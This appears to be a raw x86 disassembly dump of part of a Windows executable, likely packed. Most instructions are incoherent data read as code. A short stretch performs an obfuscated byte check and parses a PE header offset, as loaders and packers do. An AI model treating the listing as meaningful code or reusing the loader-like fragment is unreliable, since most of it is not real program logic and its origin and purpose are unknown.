  40f8e7:	fild   DWORD PTR [ebp+0x48]
  40f8ea:	and    eax,0xf01bed71
  40f8ef:	lock fisttp WORD PTR [edi+edx*4+0x36e626b]
  40f8f7:	xchg   ecx,eax
  40f8f8:	std    
  40f8f9:	(bad)  
  40f8fa:	mov    ?,ecx
  40f8fc:	dec    edi
  40f8fd:	or     BYTE PTR [eax+ebx*4-0x29fe76bc],ch
  40f904:	inc    ebx
  40f905:	xchg   ebp,eax
  40f906:	cld    
  40f907:	repz inc edx
  40f909:	aam    0x54
  40f90b:	push   edi
  40f90c:	les    edi,FWORD PTR [ebx-0x10]
  40f90f:	dec    ecx
  40f910:	shl    BYTE PTR [esi-0x6d6cb70],1
  40f916:	jl     0x40f986
  40f918:	push   ecx
  40f919:	(bad)  
  40f91a:	sbb    BYTE PTR [eax],dh
  40f91c:	sub    al,0x35
  40f91e:	mov    bh,0x1d
  40f920:	xchg   esi,eax
  40f921:	in     al,0x2c
  40f923:	fs sbb edx,edi
  40f926:	std    
  40f927:	ret    0xc30
  40f92a:	sar    BYTE PTR [ebx-0x7a],1
  40f92d:	repnz sahf 
  40f92f:	iret   
  40f930:	inc    ebp
  40f931:	inc    ebx
  40f932:	test   al,0x78
  40f934:	in     eax,dx
  40f935:	xchg   esi,eax
  40f936:	and    cl,bh
  40f938:	cs sub edx,eax
  40f93b:	adc    eax,0x2509c07b
  40f940:	fadd   DWORD PTR [ebx-0x2b]
  40f943:	mov    bh,0x1a
  40f945:	xor    edi,eax
  40f947:	int    0x88
  40f949:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f94a:	mov    eax,0x8d990f57
  40f94f:	add    al,0xaa
  40f951:	fisttp DWORD PTR [eax-0x6e]
  40f954:	es adc eax,0x5161c5b9
  40f95a:	cmp    BYTE PTR [ecx],ch
  40f95c:	in     al,dx
  40f95d:	pop    ss
  40f95e:	mov    esi,0x76757781
  40f963:	or     al,0x60
  40f965:	sbb    bl,BYTE PTR [esi+0x2e]
  40f968:	xchg   ebx,eax
  40f969:	into   
  40f96a:	cmp    dl,dh
  40f96c:	stos   DWORD PTR es:[edi],eax
  40f96d:	pop    ds
  40f96e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f96f:	pop    esp
  40f970:	xor    esp,DWORD PTR [edi]
  40f972:	sbb    eax,0x2338caa1
  40f977:	and    al,0x29
  40f979:	xchg   edi,edi
  40f97b:	mov    ecx,0xc0ae58d7
  40f980:	xchg   esp,eax
  40f981:	sar    DWORD PTR [esi+eax*1-0x38942166],0x2e
  40f989:	pushf  
  40f98a:	add    eax,0xb405e757
  40f98f:	and    dh,BYTE PTR [esi+eax*1-0x78]
  40f993:	cmp    al,0x47
  40f995:	mov    al,ds:0xd509ad7a
  40f99a:	fcos   
  40f99c:	mov    ebp,esp
  40f99e:	push   0xffffffbd
  40f9a0:	xor    eax,0x93a2ae54
  40f9a5:	loopne 0x40fa23
  40f9a7:	mov    eax,0x4496cd2f
  40f9ac:	jbe    0x40f9bb
  40f9ae:	es jbe 0x40f9ec
  40f9b1:	stc    
  40f9b2:	xor    BYTE PTR [edx+0x23c6aa1],ah
  40f9b8:	adc    al,0xbf
  40f9ba:	gs sahf 
  40f9bc:	sub    al,0x68
  40f9be:	xor    bh,BYTE PTR [ebx-0x4c46efca]
  40f9c4:	call   FWORD PTR [edx]
  40f9c6:	imul   ebp,DWORD PTR [edx+0x43],0x9f5cd95e
  40f9cd:	mov    ebp,ecx
  40f9cf:	ror    BYTE PTR [esi+0x4f156ba7],cl
  40f9d5:	dec    ebx
  40f9d6:	cmp    eax,0xd02235cc
  40f9db:	inc    eax
  40f9dc:	mov    eax,ds:0xc8fc23dd
  40f9e1:	scas   al,BYTE PTR es:[edi]
  40f9e2:	push   0xffffff8f
  40f9e4:	mov    bl,0xc4
  40f9e6:	je     0x40f9e0
  40f9e8:	sar    BYTE PTR ds:[ebp-0x62],0xd8
  40f9ed:	jmp    0x276a:0x8071512
  40f9f4:	adc    DWORD PTR [ebx-0x61],ebx
  40f9f7:	sub    al,BYTE PTR [edx+0x6f]
  40f9fa:	neg    BYTE PTR [edx]
  40f9fc:	xchg   BYTE PTR [ecx+ecx*1-0x71],al
  40fa00:	mov    edx,0x707a794f
  40fa05:	loope  0x40fa14
  40fa07:	ror    DWORD PTR [edx+0x148c318e],0xdb
  40fa0e:	inc    edi
  40fa0f:	push   esi
  40fa10:	cli    
  40fa11:	xchg   ebx,eax
  40fa12:	ins    DWORD PTR es:[edi],dx
  40fa13:	das    
  40fa14:	sub    BYTE PTR [edx],0x43
  40fa17:	sub    al,BYTE PTR [esi-0x50cd8084]
  40fa1d:	sbb    esp,DWORD PTR [ecx+0x534a104d]
  40fa23:	aas    
  40fa24:	jp     0x40f9ed
  40fa26:	pop    edi
  40fa27:	or     BYTE PTR [ecx+edx*8],dl
  40fa2a:	mov    esp,0x771753c8
  40fa2f:	into   
  40fa30:	nop
  40fa31:	into   
  40fa32:	mov    ebx,0x7c29021e
  40fa37:	jne    0x40fa99
  40fa39:	push   cs
  40fa3a:	and    al,0x9d
  40fa3c:	(bad)  
  40fa3d:	shl    BYTE PTR [edi],cl
  40fa3f:	pop    ebx
  40fa40:	mov    WORD PTR es:[edi],fs
  40fa43:	xchg   ecx,eax
  40fa44:	sub    BYTE PTR [edi-0x80],bh
  40fa47:	jno    0x40fab9
  40fa49:	mov    esp,0x6e1b263a
  40fa4e:	mov    ebp,0xf1975116
  40fa53:	jg     0x40f9e8
  40fa55:	cwde   
  40fa56:	cdq    
  40fa57:	pop    edi
  40fa58:	mov    ds:0x3a76a722,eax
  40fa5d:	mov    esi,0xb72232a0
  40fa62:	iret   
  40fa63:	call   0xcd4a:0xf92ba122
  40fa6a:	inc    edx
  40fa6b:	bound  edi,QWORD PTR [edi]
  40fa6d:	out    0xec,al
  40fa6f:	inc    edx
  40fa70:	int3   
  40fa71:	inc    esp
  40fa72:	inc    esi
  40fa73:	ret    0x72f7
  40fa76:	cwd    
  40fa78:	mov    DWORD PTR [edi+0x4e58f36a],ecx
  40fa7e:	gs ret 
  40fa80:	pop    esp
  40fa81:	mov    esp,0xafcb1114
  40fa86:	pop    esp
  40fa87:	ficomp DWORD PTR [eax+0x505fdf52]
  40fa8d:	push   ebx
  40fa8e:	mov    ss:0x6da6a242,al
  40fa94:	mov    ah,0x88
  40fa96:	jo     0x40fa51
  40fa98:	jp     0x40faf1
  40fa9a:	and    ebx,esp
  40fa9c:	add    eax,0x19f617c6
  40faa1:	je     0x40fa7f
  40faa3:	inc    esi
  40faa4:	and    DWORD PTR [ebp-0x6f],eax
  40faa7:	popa   
  40faa8:	ss int 0x40
  40faab:	inc    esp
  40faac:	jae    0x40fb14
  40faae:	or     BYTE PTR [edx],0x6c
  40fab1:	rcr    BYTE PTR [edi-0x3b],0x23
  40fab5:	mov    esi,0xf27b463a
  40faba:	mov    cl,0x82
  40fabc:	mov    ebp,0x135af815
  40fac1:	sbb    bl,BYTE PTR [ebx]
  40fac3:	sub    eax,ecx
  40fac5:	push   ds
  40fac6:	and    dh,BYTE PTR gs:[esi-0x36b28668]
  40facd:	cli    
  40face:	clc    
  40facf:	mov    eax,0xb3d188c
  40fad4:	cmp    eax,0x1201b4b5
  40fad9:	ror    DWORD PTR [eax+0x7ee10ed4],1
  40fadf:	enter  0x698e,0xd7
  40fae3:	sbb    cl,BYTE PTR [edx+0x62]
  40fae6:	js     0x40fa7b
  40fae8:	daa    
  40fae9:	fmul   DWORD PTR [edi+0x62a9bb83]
  40faef:	bnd jmp 0x7c6a72e8
  40faf5:	or     DWORD PTR [ebp+0x77],0xffffffa7
  40faf9:	dec    ebp
  40fafa:	pop    ebx
  40fafb:	mov    ds:0x30a6d91e,al
  40fb00:	cmc    
  40fb01:	loopne 0x40faf9
  40fb03:	mov    ebp,0x855f5be0
  40fb08:	mov    ebx,0xd83c1a80
  40fb0d:	imul   ebp,DWORD PTR [esi+0x4e6c6cb8],0xca7bf2e2
  40fb17:	ss loopne 0x40faef
  40fb1a:	out    dx,al
  40fb1b:	sbb    dh,dh
  40fb1d:	adc    esi,DWORD PTR [ecx+0x46905df9]
  40fb23:	stc    
  40fb24:	or     BYTE PTR [esi-0x75],ch
  40fb27:	mov    ds:0x82cb8429,al
  40fb2c:	and    cl,0x30
  40fb2f:	fld    QWORD PTR [ebx*2-0x739c4362]
  40fb36:	jnp    0x40fb07
  40fb38:	sbb    al,0x7f
  40fb3a:	mov    esp,0x3a93c32b
  40fb3f:	loop   0x40fad8
  40fb41:	sub    edi,DWORD PTR [edi]
  40fb43:	lods   al,BYTE PTR ds:[esi]
  40fb44:	pop    ebp
  40fb45:	push   es
  40fb46:	adc    BYTE PTR [esi-0x3f],0x69
  40fb4a:	push   edx
  40fb4b:	(bad)
  40fb4e:	lds    edx,FWORD PTR [esi-0x6e3f712a]
  40fb54:	call   0x5ddd3a0c
  40fb59:	and    DWORD PTR [esi+0x4b058fa],ecx
  40fb5f:	jo     0x40fb50
  40fb61:	aam    0xba
  40fb63:	popa   
  40fb64:	call   0xdac288a6
  40fb69:	jg     0x40faf2
  40fb6b:	jg     0x40fb5c
  40fb6d:	ja     0x40fb37
  40fb6f:	in     al,dx
  40fb70:	pushf  
  40fb71:	lea    ecx,[ecx+0x14ae879b]
  40fb77:	add    eax,0x7f2324a5
  40fb7c:	arpl   WORD PTR [ebp+ecx*2+0x69],di
  40fb80:	xchg   ebp,eax
  40fb81:	push   ds
  40fb82:	dec    ebp
  40fb83:	(bad)  
  40fb84:	aam    0x7
  40fb86:	jmp    0x40fbb8
  40fb88:	xchg   esp,eax
  40fb89:	jge    0x40fb39
  40fb8b:	test   BYTE PTR [edi-0x1fc41acf],ah
  40fb91:	ror    DWORD PTR [eax-0x24d1c47],1
  40fb97:	cs jb  0x40fb8c
  40fb9a:	push   ecx
  40fb9b:	neg    DWORD PTR ds:0x42e124
  40fba1:	jmp    0x40ff6b
  40fba6:	mov    ebp,ecx
  40fba8:	cli    
  40fba9:	xor    DWORD PTR [edx-0x648a4e8f],edi
  40fbaf:	test   BYTE PTR [ebp-0x51],0x3d
  40fbb3:	or     BYTE PTR [eax],0xfa
  40fbb6:	xor    BYTE PTR [ecx+0x7da37070],0x70
  40fbbd:	jo     0x40fbfa
  40fbbf:	pop    eax
  40fbc0:	sti    
  40fbc1:	mov    ah,0x6e
  40fbc3:	inc    esi
  40fbc4:	ins    DWORD PTR es:[edi],dx
  40fbc5:	dec    ebx
  40fbc6:	sbb    al,0x14
  40fbc8:	ja     0x40fb8c
  40fbca:	jae    0x40fc11
  40fbcc:	data16 cmp BYTE PTR [esi-0x2f],dh
  40fbd0:	sbb    dl,BYTE PTR [eax]
  40fbd2:	sbb    DWORD PTR [edi+0x19],ecx
  40fbd5:	sub    al,BYTE PTR ds:[ebx]
  40fbd8:	(bad)  
  40fbd9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fbda:	or     eax,0x7e175f15
  40fbdf:	jg     0x40fbe5
  40fbe1:	push   ss
  40fbe2:	lds    ebp,FWORD PTR [eax+esi*4+0x26]
  40fbe6:	push   ds
  40fbe7:	icebp  
  40fbe8:	mov    bh,ah
  40fbea:	ret    
  40fbeb:	jb     0x40fbf2
  40fbed:	and    DWORD PTR [esi],ebx
  40fbef:	les    ecx,FWORD PTR [eax+ebp*1+0x25729ac5]
  40fbf6:	push   ebp
  40fbf7:	push   0x66707f0
  40fbfc:	mov    edx,0x77c3ee18
  40fc01:	fstp   TBYTE PTR [edx]
  40fc03:	pop    esp
  40fc04:	mov    al,ds:0xdac2e2f8
  40fc09:	xchg   ebp,eax
  40fc0a:	lds    esp,FWORD PTR [ecx]
  40fc0c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fc0d:	add    eax,0xffbd1cb4
  40fc12:	push   cs
  40fc13:	test   dh,bl
  40fc15:	(bad)  
  40fc17:	mov    al,ds:0xf0af2a4e
  40fc1c:	xlat   BYTE PTR ds:[ebx]
  40fc1d:	das    
  40fc1e:	inc    ebp
  40fc1f:	dec    edx
  40fc20:	adc    dl,BYTE PTR [ebx+0x5d4cd857]
  40fc26:	pop    ebp
  40fc27:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fc28:	sbb    DWORD PTR [eax],esi
  40fc2a:	mov    bh,0xd9
  40fc2c:	inc    ebp
  40fc2d:	pop    esp
  40fc2e:	push   0x6b6b59fb
  40fc33:	std    
  40fc34:	popf   
  40fc35:	aam    0xf7
  40fc37:	push   edi
  40fc38:	dec    esp
  40fc39:	std    
  40fc3a:	aad    0xb2
  40fc3c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fc3d:	xchg   ebp,eax
  40fc3e:	fisubr WORD PTR [ecx-0x41870229]
  40fc44:	shr    DWORD PTR [ebx],cl
  40fc46:	cmp    esi,DWORD PTR [ecx+ebx*8-0x7e]
  40fc4a:	out    0x90,al
  40fc4c:	xchg   ecx,eax
  40fc4d:	(bad)  
  40fc4f:	mov    edi,0x15b24dd6
  40fc54:	mov    ebx,DWORD PTR [esi-0x7b]
  40fc57:	mov    gs,WORD PTR [edi-0x73a3b8e5]
  40fc5d:	mov    bl,0xf8
  40fc5f:	(bad)  
  40fc60:	push   ebp
  40fc61:	jle    0x40fc7d
  40fc63:	popf   
  40fc64:	pop    esi
  40fc65:	imul   ebx,DWORD PTR [esi+ebx*1-0x2381c8aa],0x20
  40fc6d:	mov    bh,0xc5
  40fc6f:	push   esi
  40fc70:	inc    ebp
  40fc71:	sbb    eax,0x3aae1885
  40fc76:	fstp   TBYTE PTR [edx]
  40fc78:	inc    eax
  40fc79:	add    BYTE PTR [ecx+edi*4-0x75],bl
  40fc7d:	(bad)  
  40fc7e:	(bad)  
  40fc80:	jmp    0x40fc6b
  40fc82:	jmp    0x40fc15
  40fc84:	(bad)
  40fc87:	jne    0x40fcb1
  40fc89:	xchg   edx,eax
  40fc8a:	pop    edx
  40fc8b:	sub    ch,BYTE PTR [edi+0x5a8fe612]
  40fc91:	out    0x94,eax
  40fc93:	daa    
  40fc94:	das    
  40fc95:	and    ebp,DWORD PTR [edi+ebp*8]
  40fc98:	jb     0x40fc71
  40fc9a:	int3   
  40fc9b:	jmp    0x260d:0x27c955b1
  40fca2:	sahf   
  40fca3:	xchg   esp,eax
  40fca4:	xlat   BYTE PTR ds:[ebx]
  40fca5:	jb     0x40fcc7
  40fca7:	sub    BYTE PTR [edx-0x2a6b2438],0x3e
  40fcae:	icebp  
  40fcaf:	push   0xfffffffe
  40fcb1:	scas   al,BYTE PTR es:[edi]
  40fcb2:	into   
  40fcb3:	ret    0x5a6a
  40fcb6:	rcr    DWORD PTR [eax+esi*1],cl
  40fcb9:	sub    DWORD PTR [esi-0x69bd539e],ecx
  40fcbf:	jmp    0x40fd12
  40fcc1:	and    DWORD PTR [edx],0x9f8052a6
  40fcc7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fcc8:	add    esp,DWORD PTR [ebp-0x500409fe]
  40fcce:	popf   
  40fccf:	push   esi
  40fcd0:	fiadd  DWORD PTR [esi-0x7f]
  40fcd3:	pop    edi
  40fcd4:	out    0x1c,eax
  40fcd6:	xchg   ebx,eax
  40fcd7:	pop    ebp
  40fcd8:	cwde   
  40fcd9:	outs   dx,BYTE PTR ds:[esi]
  40fcda:	retf   0x39ea
  40fcdd:	into   
  40fcde:	pop    ecx
  40fcdf:	nop
  40fce0:	mov    ecx,es
  40fce2:	cmp    ch,BYTE PTR [ebp+0x7567ceed]
  40fce8:	jne    0x40fd55
  40fcea:	mov    WORD PTR [edx+edx*4-0x3],?
  40fcee:	xor    al,0x2
  40fcf0:	mov    ah,0xbb
  40fcf2:	cmp    DWORD PTR [esi],0x7e
  40fcf5:	lahf   
  40fcf6:	or     DWORD PTR [edi+0xd],edx
  40fcf9:	popf   
  40fcfa:	in     eax,0x3d
  40fcfc:	mov    ebp,0x69e9ad9f
  40fd01:	ficom  DWORD PTR [edx+eiz*1+0x38]
  40fd05:	mov    BYTE PTR [ebx+0x71],dl
  40fd08:	adc    DWORD PTR [edi],ecx
  40fd0a:	clc    
  40fd0b:	xor    eax,0x4b
  40fd0e:	and    eax,0x2627cd64
  40fd13:	lds    esp,FWORD PTR [edi+0x1d5af253]
  40fd19:	retf   
  40fd1a:	test   BYTE PTR [ecx-0x6f3c5cfe],ah
  40fd20:	xlat   BYTE PTR ds:[ebx]
  40fd21:	jg     0x40fd5b
  40fd23:	xchg   ebx,eax
  40fd24:	jno    0x40fd80
  40fd26:	loopne 0x40fd07
  40fd28:	(bad)  
  40fd29:	mov    eax,0xead29fe6
  40fd2e:	les    edi,FWORD PTR [eax+0x7989b195]
  40fd34:	shr    BYTE PTR [edx],cl
  40fd36:	test   al,0xcb
  40fd38:	inc    ebp
  40fd39:	mov    bh,0xd
  40fd3b:	push   ebp
  40fd3c:	push   edx
  40fd3d:	test   eax,0x80d8853b
  40fd42:	sahf   
  40fd43:	mov    eax,0xa8f1cbea
  40fd48:	mov    ds:0x9d4edcbe,eax
  40fd4d:	test   al,0x3a
  40fd4f:	mov    edi,0x82b66026
  40fd54:	push   ss
  40fd55:	out    0x34,al
  40fd57:	inc    esi
  40fd58:	dec    edi
  40fd59:	ss mov cl,0xab
  40fd5c:	cs (bad) 
  40fd5f:	ret    
  40fd60:	call   0x5f065fac
  40fd65:	jmp    0x598dda2e
  40fd6a:	add    ebp,ebx
  40fd6c:	pop    es
  40fd6d:	sbb    DWORD PTR [eax+0xa],ebp
  40fd70:	ins    DWORD PTR es:[edi],dx
  40fd71:	xor    ah,bh
  40fd73:	xor    DWORD PTR [esi],ebx
  40fd75:	jl     0x40fdb9
  40fd77:	xor    esi,edi
  40fd79:	mov    dh,0xfb
  40fd7b:	in     eax,dx
  40fd7c:	ror    DWORD PTR [edi-0x39],0x98
  40fd80:	ds shr eax,1
  40fd83:	mov    bl,BYTE PTR [edi+edx*8-0x3192fc0e]
  40fd8a:	(bad)  
  40fd8b:	fimul  WORD PTR [esi+0x7eead57b]
  40fd91:	inc    ecx
  40fd92:	push   0xc78fcde7
  40fd97:	popa   
  40fd98:	bndldx bnd3,[ecx-0x6ad86393]
  40fd9f:	xchg   edi,eax
  40fda0:	inc    ebp
  40fda1:	int3   
  40fda2:	pop    es
  40fda3:	add    bh,BYTE PTR [ebx+ebx*8-0x32]
  40fda7:	not    DWORD PTR [eax+0x26]
  40fdaa:	mov    dh,0x6a
  40fdac:	add    ebx,DWORD PTR fs:[edx+0x1953ba93]
  40fdb3:	imul   edi,DWORD PTR [ebx-0xe],0xe3170c97
  40fdba:	mov    edx,0x8548bd1f
  40fdbf:	or     DWORD PTR [ebx+0x1c43e13d],edx
  40fdc5:	hlt    
  40fdc6:	dec    edi
  40fdc7:	push   cs
  40fdc8:	pop    edx
  40fdc9:	daa    
  40fdca:	aaa    
  40fdcb:	xchg   ebp,eax
  40fdcc:	ins    BYTE PTR es:[edi],dx
  40fdcd:	dec    esi
  40fdce:	call   0xcc09:0x283ca59a
  40fdd5:	ror    DWORD PTR [si],1
  40fdd8:	in     al,dx
  40fdd9:	and    esp,ecx
  40fddb:	popa   
  40fddc:	push   ecx
  40fddd:	or     DWORD PTR [ebx-0x2f],0xd038adf0
  40fde4:	sbb    eax,0xc5f21035
  40fde9:	cld    
  40fdea:	jns    0x40fdca
  40fdec:	enter  0x98d5,0x0
  40fdf0:	iret   
  40fdf1:	fadd   DWORD PTR [ecx-0x38518a69]
  40fdf7:	arpl   WORD PTR [ebp+0x6c943d73],cx
  40fdfd:	ins    DWORD PTR es:[edi],dx
  40fdfe:	jmp    0x40fe4a
  40fe00:	out    0x26,al
  40fe02:	mov    eax,ds:0x6e73f678
  40fe07:	pop    es
  40fe08:	in     al,0x5
  40fe0a:	fidivr WORD PTR [edx]
  40fe0c:	push   ss
  40fe0d:	icebp  
  40fe0e:	mov    ah,0x7e
  40fe10:	fsubr  DWORD PTR [ecx+0x2b]
  40fe13:	rcl    DWORD PTR ds:0xa915472b,cl
  40fe19:	add    dh,BYTE PTR [ebp+0x486de2a2]
  40fe1f:	ja     0x40fdd8
  40fe21:	sbb    edx,DWORD PTR [edi+0x3f]
  40fe24:	enter  0x4833,0xd6
  40fe28:	xchg   ebp,eax
  40fe29:	retf   
  40fe2a:	ret    0xec5b
  40fe2d:	sub    bh,BYTE PTR [edi]
  40fe2f:	je     0x40fe64
  40fe31:	xchg   edi,eax
  40fe32:	(bad)  
  40fe33:	aaa    
  40fe34:	mov    bh,0xfb
  40fe36:	fisttp QWORD PTR [edx-0x6a23d929]
  40fe3c:	sub    DWORD PTR [edx-0x22],edi
  40fe3f:	out    dx,eax
  40fe40:	test   bl,ah
  40fe42:	dec    esi
  40fe43:	mov    eax,0x68693cd4
  40fe48:	mov    bh,bl
  40fe4a:	inc    ebx
  40fe4b:	and    ebx,edi
  40fe4d:	dec    eax
  40fe4e:	inc    ebx
  40fe4f:	cmp    BYTE PTR [ebp-0x7],ch
  40fe52:	xchg   edx,eax
  40fe53:	add    DWORD PTR [edi+0x45],edi
  40fe56:	out    0x17,al
  40fe58:	call   0x8bae:0xf26c1d1b
  40fe5f:	add    dh,al
  40fe61:	out    0xaf,al
  40fe63:	call   0x6ff88432
  40fe68:	cld    
  40fe69:	cmp    BYTE PTR [ebx],cl
  40fe6b:	sbb    eax,0x96e10164
  40fe70:	dec    ebx
  40fe71:	dec    ebx
  40fe72:	pop    es
  40fe73:	xchg   esi,eax
  40fe74:	popf   
  40fe75:	call   0xebdceab2
  40fe7a:	out    0x3e,eax
  40fe7c:	xchg   esp,eax
  40fe7d:	int    0xe1
  40fe7f:	js     0x40fe69
  40fe81:	push   eax
  40fe82:	in     eax,dx
  40fe83:	mov    al,0x9c
  40fe85:	sub    al,0x27
  40fe87:	push   edi
  40fe88:	mov    edx,0xf4d5e9eb
  40fe8d:	cmp    BYTE PTR [ebx],dh
  40fe8f:	clc    
  40fe90:	xor    BYTE PTR [ecx+0x30ad0ef1],dh
  40fe96:	aaa    
  40fe97:	jo     0x40fe30
  40fe99:	cwde   
  40fe9a:	test   eax,0x80c91d1e
  40fe9f:	sar    BYTE PTR [ebp-0x1ba657bc],0x2a
  40fea6:	cs mov edi,0xceffb9f8
  40feac:	adc    ah,BYTE PTR [edi]
  40feae:	ret    0x2469
  40feb1:	mov    bh,bh
  40feb3:	mov    ds:0x3652285c,eax
  40feb8:	dec    eax
  40feb9:	imul   ebp,DWORD PTR [edx-0x36c94d04],0xc
  40fec0:	mov    dl,0x40
  40fec2:	xor    DWORD PTR [edi+0x409bb97c],eax
  40fec8:	out    0x6f,eax
  40feca:	mov    ds:0x6a667e52,al
  40fecf:	(bad)  
  40fed0:	(bad)  
  40fed1:	mov    ebp,0x9690ea97
  40fed6:	xchg   ebp,eax
  40fed7:	mov    DWORD PTR [ecx-0x65a253c2],eax
  40fedd:	scas   al,BYTE PTR es:[edi]
  40fede:	pop    esi
  40fedf:	iret   
  40fee0:	jecxz  0x40febe
  40fee2:	inc    edi
  40fee3:	pop    eax
  40fee4:	jns    0x40fef7
  40fee6:	push   ebx
  40fee7:	xchg   esp,eax
  40fee8:	xchg   edx,eax
  40fee9:	xchg   ecx,eax
  40feea:	cmc    
  40feeb:	push   ebx
  40feec:	jb     0x40fe7a
  40feee:	xor    eax,0xf61c3493
  40fef3:	call   0xbbc5:0x8c39242c
  40fefa:	cmovne eax,DWORD PTR [edi+0x1a506267]
  40ff01:	jbe    0x40ff7d
  40ff03:	arpl   WORD PTR [ebx+0x4b179128],ax
  40ff09:	cld    
  40ff0a:	jnp    0x40fec5
  40ff0c:	xchg   edx,eax
  40ff0d:	mov    ds:0x910a9b9b,al
  40ff12:	rol    BYTE PTR [eax-0x29],1
  40ff15:	or     al,0xb4
  40ff17:	mov    ds:0x7bae1713,eax
  40ff1c:	lds    edx,FWORD PTR [ebp+ebp*2-0x38]
  40ff20:	aad    0xcc
  40ff22:	pusha  
  40ff23:	int3   
  40ff24:	inc    edx
  40ff25:	cs jns 0x40fec4
  40ff28:	aam    0x33
  40ff2a:	dec    ebx
  40ff2b:	or     esp,DWORD PTR [esi-0x80]
  40ff2e:	ret    
  40ff2f:	xchg   ebx,eax
  40ff30:	ds mov ah,0xda
  40ff33:	mov    bh,0xcf
  40ff35:	fistp  DWORD PTR [edi+esi*1+0x1c81d478]
  40ff3c:	aad    0xb
  40ff3e:	xchg   ecx,eax
  40ff3f:	jnp    0x40ff3e
  40ff41:	and    al,ch
  40ff43:	inc    ebp
  40ff44:	leave  
  40ff45:	lods   al,BYTE PTR ds:[esi]
  40ff46:	sub    BYTE PTR ds:0xfa0d6573,bh
  40ff4c:	xor    ecx,DWORD PTR [eax]
  40ff4e:	xchg   edx,eax
  40ff4f:	in     al,dx
  40ff50:	pop    esi
  40ff51:	aaa    
  40ff52:	lea    edx,[edi+0x66]
  40ff55:	mov    eax,ss
  40ff57:	in     eax,dx
  40ff58:	sar    DWORD PTR [ebp+0x2b],0x2f
  40ff5c:	test   BYTE PTR [ecx-0x1b],cl
  40ff5f:	test   DWORD PTR [edi+0x2774b5b5],0x35ecf68b
  40ff69:	into   
  40ff6a:	pop    ecx
  40ff6b:	mov    DWORD PTR [ebp-0x4],0xf89c8531
  40ff72:	mov    eax,DWORD PTR [ebp+0x8]
  40ff75:	mov    al,BYTE PTR [eax]
  40ff77:	mov    DWORD PTR ds:0x42e134,0x3a3a
  40ff81:	add    al,0x37
  40ff83:	xor    DWORD PTR ds:0x42e6f7,0x42fd7e
  40ff8d:	xor    al,0x47
  40ff8f:	mov    DWORD PTR ds:0x42fcd1,0x1793
  40ff99:	cmp    al,0xc3
  40ff9b:	jne    0x410b7f
  40ffa1:	mov    eax,DWORD PTR [ebp+0x8]
  40ffa4:	mov    edx,DWORD PTR ds:0x42fd76
  40ffaa:	and    edx,DWORD PTR ds:0x42e6fb
  40ffb0:	mov    DWORD PTR ds:0x42fd76,edx
  40ffb6:	mov    ecx,DWORD PTR [ebp+0x8]
  40ffb9:	mov    DWORD PTR ds:0x42e703,0x1299
  40ffc3:	add    ecx,DWORD PTR [eax+0x3c]
  40ffc6:	mov    edx,0x7510855
  40ffcb:	jmp    0x410395
  40ffd0:	fcmovnbe st,st(4)
  40ffd2:	aam    0xc8
  40ffd4:	repz enter 0xf3db,0x5c
  40ffd9:	push   edx
  40ffda:	jae    0x40fff5
  40ffdc:	xchg   bh,dh
  40ffde:	jle    0x40ff94
  40ffe0:	xor    eax,0xa37070bd
  40ffe5:	jge    0x410057
  40ffe7:	jo     0x40ffbf
  40ffe9:	xchg   DWORD PTR [edi-0x1aad3dae],esp
  40ffef:	mov    ebp,0xfe7944e1
  40fff4:	dec    edi
  40fff5:	in     eax,0x8a
  40fff7:	jo     0x40ffe0
  40fff9:	rol    DWORD PTR [esi-0x63e662e8],0x68
  410000:	adc    al,0x23
  410002:	ja     0x410021
  410004:	jge    0x410038
  410006:	or     BYTE PTR [edi-0x46],cl
  410009:	cwde   
  41000a:	push   ecx
  41000b:	mov    ds:0xec939969,al
  410010:	dec    esp
  410011:	nop
  410012:	push   ds
  410013:	xchg   esi,eax
  410014:	test   DWORD PTR [ebp+0x4c],ebx
  410017:	lea    edx,[edi+0x11]
  41001a:	jg     0x40fff3
  41001c:	shl    DWORD PTR [ebx-0x7bec19c3],cl
  410022:	add    al,0x94
  410024:	nop
  410025:	add    BYTE PTR ss:[edx+0x58],bh
  410029:	or     BYTE PTR [eax+ebp*4-0x51854d88],bl
  410030:	add    dl,BYTE PTR [ebp-0x16]
  410033:	repz ret 0xe525
  410037:	dec    eax
  410038:	fistp  WORD PTR [edx-0x2bf14e4c]
  41003e:	fdiv   DWORD PTR [edx-0x7c]
  410041:	mov    eax,ds:0x8c188cf
  410046:	mov    ds:0xf92b6d30,eax
  41004b:	and    al,0x19
  41004d:	cmp    BYTE PTR ds:0x1ffbd7b4,cl
  410053:	mov    ebp,0x7354102d
  410058:	rcl    BYTE PTR [edx],1
  41005a:	fimul  WORD PTR [esi]
  41005c:	popf   
  41005d:	test   DWORD PTR [esi+0x3c],ecx
  410060:	pusha  
  410061:	jge    0x4100c3
  410063:	popa   
  410064:	cmp    DWORD PTR [ebx],esi
  410066:	mov    dl,0x5f
  410068:	fst    QWORD PTR [eax]
  41006a:	or     eax,0xd225602b
  41006f:	jns    0x4100d2
  410071:	rcl    DWORD PTR [edi],1
  410073:	pop    DWORD PTR [ebx]
  410075:	jecxz  0x4100bf
  410077:	or     eax,0x5c27b34f
  41007c:	enter  0x9130,0xdb
  410080:	mov    edi,0xe31924b7
  410085:	push   0x3debf1c8
  41008a:	dec    edx
  41008b:	cld    
  41008c:	pop    ebx
  41008d:	inc    ecx
  41008e:	or     DWORD PTR [esi],esp
  410090:	lods   eax,DWORD PTR ds:[esi]
  410091:	fdiv   DWORD PTR [ebx-0xf8c5b6a]
  410097:	or     ebx,DWORD PTR [eax+0x42]
  41009a:	pop    esp
  41009b:	out    0x1c,al
  41009d:	xchg   ebx,eax
  41009e:	xchg   sp,ax
  4100a0:	xlat   BYTE PTR ds:[ebx]
  4100a1:	add    eax,0x31eb7783
  4100a6:	inc    ecx
  4100a7:	mov    dl,0x3e
  4100a9:	inc    esp
  4100aa:	mov    dh,0xbf
  4100ac:	mov    BYTE PTR [ecx],0xc8
  4100af:	enter  0x5bd6,0x1c
  4100b3:	cs sub eax,0x6bcdbb6a
  4100b9:	clc    
  4100ba:	gs add ebx,esp
  4100bd:	mov    ah,0xca
  4100bf:	jnp    0x41013b
  4100c1:	cmp    eax,eax
  4100c3:	clc    
  4100c4:	fmul   QWORD PTR [eax-0x1282b37]
